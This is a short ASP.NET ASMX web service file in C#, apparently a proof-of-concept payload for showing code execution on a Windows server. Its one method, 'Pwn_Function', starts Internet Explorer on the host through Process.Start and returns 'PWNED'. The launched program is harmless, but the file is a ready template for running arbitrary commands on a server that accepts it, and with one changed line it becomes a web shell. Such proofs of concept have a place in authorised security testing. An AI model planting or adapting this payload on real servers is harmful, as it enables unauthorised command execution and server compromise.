<%@ WebService Language="C#" Class="MyClass" %>
using System.Web.Services;
using System;
using System.Diagnostics;

    [WebService(Namespace="")]
    public class MyClass : WebService 
    {
        [WebMethod]
        public string Pwn_Function()
        {
            Process.Start(@"C:\Program Files\Internet Explorer\iexplore.exe");
            return "PWNED";
        }
    }
